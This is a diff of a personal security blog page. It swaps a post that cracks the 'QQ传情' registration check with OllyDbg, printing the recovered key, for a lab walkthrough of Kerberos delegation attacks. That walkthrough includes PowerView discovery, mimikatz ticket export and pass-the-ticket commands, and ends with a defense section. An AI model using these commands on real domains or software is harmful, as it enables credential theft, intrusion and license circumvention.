@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>破解QQ传情 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="破解QQ传情 | 九世的博客">
+  <title>Kerberos委派攻击 | 九世的博客</title>
+  <meta name="keywords" content=" 域渗透 ">
+  <meta name="description" content="Kerberos委派攻击 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1291,9 +1291,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-破解QQ传情" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-Kerberos委派攻击" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">破解QQ传情</h1>
+        <h1 class="article-title">Kerberos委派攻击</h1>
     
     <div class="article-meta">
         
@@ -1302,14 +1302,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color4">域渗透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-09-01 15:56</time>
+        创建时间:<time class="date" title="更新时间: 2020-02-13 14:31:43">2020-02-13 13:25</time>
         
     </div>
     <div class="article-meta">
@@ -1331,7 +1331,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00前言"><span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01环境"><span class="toc-text">0x01环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02何为委派"><span class="toc-text">0x02何为委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03委派的分类"><span class="toc-text">0x03委派的分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04非约束委派的设置"><span class="toc-text">0x04非约束委派的设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05约束委派的设置"><span class="toc-text">0x05约束委派的设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06两者设置后在AD-EDIT的区别"><span class="toc-text">0x06两者设置后在AD EDIT的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07非约束委派的发现"><span class="toc-text">0x07非约束委派的发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08约束委派的发现"><span class="toc-text">0x08约束委派的发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09非约束委派的利用"><span class="toc-text">0x09非约束委派的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10约束委派的利用"><span class="toc-text">0x10约束委派的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11委派攻击的防御"><span class="toc-text">0x11委派攻击的防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1346,13 +1346,67 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天暑假最后一天，我特么的不想上学。回到学校见到特么63个男的加见到丑的一批的班主任，就忍不住把那些老师全部打死，天天拿毕业证说事。<br><img src="https://s1.ax1x.com/2018/09/01/PxF9mT.jpg" alt="PxF9mT.jpg"> <img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=3988330260,3412584568&amp;fm=26&amp;gp=0.jpg" alt="u=3988330260,3412584568&amp;fm=26&amp;gp=0.jpg"></p>
-<p><code>猫女被打爆了头...</code></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>恒大的课程看到了第九课，第八课的课件失踪了。到时候补上，我们拿到的课件的软件名叫做<br>QQ传情= =，这名字。。不管了，先来看看软件<br>首先打开软件，发现他让你注册，注册码瞎几把乱填。<br><img src="https://s1.ax1x.com/2018/09/01/PxF3hd.md.png" alt="PxF3hd.md.png"><br>然后点击注册软件，让你重启验证。<br><img src="https://s1.ax1x.com/2018/09/01/PxFG9A.png" alt="PxFG9A.png"><br>注册码当然是错误的，我们可以发现文件夹里有几个ini配置文件，值得关注的是Config.ini我们按进去看看打开软件也是没用注册。这里也没用像星空网游的那个软件一样重启验证后有提示，也就是说我们这里没用关键字！那我们该怎么办？先关闭软件吧。<br><img src="https://s1.ax1x.com/2018/09/01/PxFtjP.md.png" alt="PxFtjP.md.png"><br>然后查壳<br><img src="https://s1.ax1x.com/2018/09/01/PxFe6x.md.png" alt="PxFe6x.md.png"><br>无壳，然后载入OD<br><img src="https://s1.ax1x.com/2018/09/01/PxFK0O.png" alt="PxFK0O.png"><br>按照课程思路，按BP下一个<code>GetPrivateProfileStringA断点</code><br>(这个断点专门用来搞ini重启验证的)<br>然后F9运行程序，发现程序断在了断点上<br><img src="https://s1.ax1x.com/2018/09/01/PxFcj0.md.png" alt="PxFcj0.md.png"><br>然后我们发现我们从<code>程序领空进入到了系统领空</code>。</p>
-<pre><code>程序领空：OD左上角文件名如果文件是程序名就是程序领空
-系统领空：OD左上角文件名如果不是程序名的话就是系统领空
-</code></pre><p>系统领空<br><img src="https://s1.ax1x.com/2018/09/01/PxFoC9.md.png" alt="PxFoC9.md.png"><br>按Alt+F9或者调试按执行到用户代码跳出系统领空。<br>(跳到了程序领空)<br><img src="https://s1.ax1x.com/2018/09/01/PxF7g1.md.png" alt="PxF7g1.md.png"><br>F8单步往下走<br><img src="https://s1.ax1x.com/2018/09/01/PxFHjx.md.png" alt="PxFHjx.md.png"><br>发现了机器码，继续单步<br>发现一个retn 跳出<br><img src="https://s1.ax1x.com/2018/09/01/PxFqu6.md.png" alt="PxFqu6.md.png"><br>继续单步<br>又跳过了一个retn之后我们又一次的进入了<code>系统领空</code><br><img src="https://s1.ax1x.com/2018/09/01/PxFLDK.md.png" alt="PxFLDK.md.png"><br>Alt+F9再次跳出<br><img src="https://s1.ax1x.com/2018/09/01/PxFx4H.md.png" alt="PxFx4H.md.png"><br>之后我们发现了我们输入的假码<br><img src="https://s1.ax1x.com/2018/09/01/PxkSCd.png" alt="PxkSCd.png"><br>继续F8到retn 跳出这个call<br>又一次出现了我们的机器码，这是不是说明真码离我们很近了呢？<br><img src="https://s1.ax1x.com/2018/09/01/PxkKvq.md.png" alt="PxkKvq.md.png"><br>发现一个可疑字符串，将其复制到剪切板，继续单步往下走<br><img src="https://s1.ax1x.com/2018/09/01/Pxk0r6.md.png" alt="Pxk0r6.md.png"><br>在一次发现可疑字符串，记录下来。现在把OD关掉试一下注册码<br><img src="https://s1.ax1x.com/2018/09/01/PxkqRs.md.png" alt="PxkqRs.md.png"></p>
-<p><img src="https://s1.ax1x.com/2018/09/01/PxAiW9.png" alt="PxAiW9.png"><br>第一次可疑字符串失败，第二个成功，所以<code>acdb9da597f5276c6e4aae7dd29b7524</code>就是注册码<br><img src="https://s1.ax1x.com/2018/09/01/PxAEsx.png" alt="PxAEsx.png"><br>转载请声明转自：422926799.github.io<br>我们下个星期在见<img src="https://s1.ax1x.com/2018/09/01/PxAmdO.png" alt="PxAmdO.png"></p>
+        <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>昨天晚上在先知社区见到一篇有关Keberos委派攻击的文章。晚上在弄别的事情没有实验，早上抽空实验了一波</p>
+<h2 id="0x01环境"><a href="#0x01环境" class="headerlink" title="0x01环境"></a>0x01环境</h2><pre><code>Windows server 2008 R2:192.168.1.122 (AD)
+Windows 7:192.168.1.107
+工具：mimikatz、keke
+</code></pre><h2 id="0x02何为委派"><a href="#0x02何为委派" class="headerlink" title="0x02何为委派"></a>0x02何为委派</h2><p>先知社区的解释：域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动<br>安全客的解释：在域中如果出现A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派</p>
+<h2 id="0x03委派的分类"><a href="#0x03委派的分类" class="headerlink" title="0x03委派的分类"></a>0x03委派的分类</h2><p>委派分为两种：</p>
+<ul>
+<li>非约束委派</li>
+<li>约束委派</li>
+</ul>
+<p>非约束委派：<br>非约束委派在Kerberos中实现时，User会将从KDC处得到的TGT发送给访问的service1（可以是任意服务），service1拿到TGT之后可以通过TGT访问域内任意其他服务，所以被称为非约束委派。</p>
+<p>约束委派：<br>由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。这里包括一组名为S4U2Self（Service for User to Self）和S4U2Proxy（Service for User to Proxy）的Kerberos协议扩展。</p>
+<h2 id="0x04非约束委派的设置"><a href="#0x04非约束委派的设置" class="headerlink" title="0x04非约束委派的设置"></a>0x04非约束委派的设置</h2><p>在域中只有服务账户才能有委派功能，所以先把用户user01设置为服务账号。</p>
+<pre><code>setspn -A https/apache2.4 user01
+</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1qfpuV.png" alt="1qfpuV.png"></p>
+<p><img src="https://s2.ax1x.com/2020/02/13/1qfuDK.png" alt="1qfuDK.png"></p>
+<p>之后在AD Edit查看用户可以看到，非约束委派设置好的标明<br><img src="https://s2.ax1x.com/2020/02/13/1qfrCj.png" alt="1qfrCj.png"></p>
+<h2 id="0x05约束委派的设置"><a href="#0x05约束委派的设置" class="headerlink" title="0x05约束委派的设置"></a>0x05约束委派的设置</h2><p>把用户设置为服务账号<br><img src="https://s2.ax1x.com/2020/02/13/1qhpRA.png" alt="1qhpRA.png"></p>
+<h2 id="0x06两者设置后在AD-EDIT的区别"><a href="#0x06两者设置后在AD-EDIT的区别" class="headerlink" title="0x06两者设置后在AD EDIT的区别"></a>0x06两者设置后在AD EDIT的区别</h2><p>当服务账号或者主机被设置为非约束性委派时，其userAccountControl属性会包含<code>TRUSTED_FOR_DELEGATION</code><br>当服务账号或者主机被设置为约束性委派时，其userAccountControl属性包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，且msDS-AllowedToDelegateTo属性会包含被约束的服务</p>
+<h2 id="0x07非约束委派的发现"><a href="#0x07非约束委派的发现" class="headerlink" title="0x07非约束委派的发现"></a>0x07非约束委派的发现</h2><p>发现域中的委派主机或账户：</p>
+<pre><code>通过Import-Module PowerView.ps1加载PowerView脚本之后使用下面的命令进行查询。
+查询域中配置非约束委派的账户：
+Get-NetUser -Unconstrained -Domain &lt;domain&gt;
+这里的PowerView是master分支的
+</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1qRNRI.png" alt="1qRNRI.png"></p>
+<p>查询域中配置非约束委派的主机：</p>
+<pre><code>Get-NetComputer -Unconstrained -Domain &lt;domain&gt;
+</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1qWdh9.png" alt="1qWdh9.png"></p>
+<h2 id="0x08约束委派的发现"><a href="#0x08约束委派的发现" class="headerlink" title="0x08约束委派的发现"></a>0x08约束委派的发现</h2><p>查询域中配置约束委派的账户：<br>（dev分支的powerSploit）</p>
+<pre><code>Get-DomainUser –TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl
+</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1q4EOx.png" alt="1q4EOx.png"></p>
+<p>查看设置了约束委派的用户：</p>
+<pre><code>Get-DomainUser -TrustedToAuth -Domain www.haq.com
+</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1q4ukD.png" alt="1q4ukD.png"></p>
+<p>查询域中配置约束委派的主机:</p>
+<pre><code>Get-DomainComputer -TrustedToAuth -Domain &lt;domain&gt;
+</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1q4atg.png" alt="1q4atg.png"></p>
+<h2 id="0x09非约束委派的利用"><a href="#0x09非约束委派的利用" class="headerlink" title="0x09非约束委派的利用"></a>0x09非约束委派的利用</h2><p>假设域控用Administrator账号smb登录了某台域机器，那这个时候域管理员的TGT已经缓存在域机器<br>使用mimikatz导出内存</p>
+<pre><code>privilege::debug
+sekurlsa::tickets /export
+</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1qI6FU.png" alt="1qI6FU.png"></p>
+<p>最主要的是这个（域管的TGT）<br><img src="https://s2.ax1x.com/2020/02/13/1qIhO1.md.png" alt="1qIhO1.md.png"></p>
+<p>此时我们在没有凭证的情况下访问域控的共享C盘是没有权限的（图忘截了，下面的图顶替一下）<br><img src="https://s2.ax1x.com/2020/02/13/1qIHYD.png" alt="1qIHYD.png"></p>
+<p>mimikatz导入凭证</p>
+<pre><code>privilege::debug
+kerberos::ptt [0;2c06d4]-2-0-40e00000-Administrator@krbtgt-WWW.HAQ.COM.kirbi
+kerberos::list
+</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1qo6Bt.png" alt="1qo6Bt.png"></p>
+<p>之后我们可以使用Enter-PSSession获取一个shell</p>
+<pre><code>Enter-PSSession -ComputerName &lt;主机名&gt;(不能IP)
+</code></pre><p><img src="https://s2.ax1x.com/2020/02/13/1qo43Q.png" alt="1qo43Q.png"></p>
+<h2 id="0x10约束委派的利用"><a href="#0x10约束委派的利用" class="headerlink" title="0x10约束委派的利用"></a>0x10约束委派的利用</h2><p>利用条件：</p>
+<pre><code>已知当前配置了约束委派的当前账户的密码
+</code></pre><p>通过已知的账户名和明文密码对KDC发起请求, 得到TGT<br><img src="https://s2.ax1x.com/2020/02/13/1q7PMj.png" alt="1q7PMj.png"></p>
+<p>使用kekeo申请TGS票据（我这里失败了）<br><img src="https://s2.ax1x.com/2020/02/13/1q7nWF.png" alt="1q7nWF.png"></p>
+<p>所以下面的导入凭证，也不会认证成功<br><img src="https://s2.ax1x.com/2020/02/13/1q7lLR.png" alt="1q7lLR.png"></p>
+<h2 id="0x11委派攻击的防御"><a href="#0x11委派攻击的防御" class="headerlink" title="0x11委派攻击的防御"></a>0x11委派攻击的防御</h2><blockquote>
+<p>通过上文中说到设置了非约束委派的账户权限如果被窃取那么攻击者可能获取非常多其他账户的TGT，所以最好是不要在域中使用非约束委派这种功能。<br>域中不需要使用委派的账户特别是administrator账户，设置为“敏感用户不能被委派”。<br>如果是win2012的系统也可以通过设置受保护的用户组来缓解委派所带来的危害。</p>
+</blockquote>
+<p><img src="https://s2.ax1x.com/2020/02/13/1q76Ff.png" alt="1q76Ff.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/7217#toc-0" target="_blank" rel="noopener">域渗透——Kerberos委派攻击 - 先知社区</a><br><a href="https://www.anquanke.com/post/id/173477" target="_blank" rel="noopener">Kerberos协议探索系列之委派篇 - 安全客，安全资讯平台</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1362,12 +1416,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>破解QQ传情</p>
+    <p><span class="copy-title">文章标题:</span>Kerberos委派攻击</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-09-01, 15:56:33</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/fdcbf63c.html" title="破解QQ传情">http://422926799.github.io/posts/fdcbf63c.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-02-13, 13:25:27</p>
+    <p><span class="copy-title">最后更新:</span>2020-02-13, 14:31:43</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/4d3be28.html" title="Kerberos委派攻击">http://422926799.github.io/posts/4d3be28.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
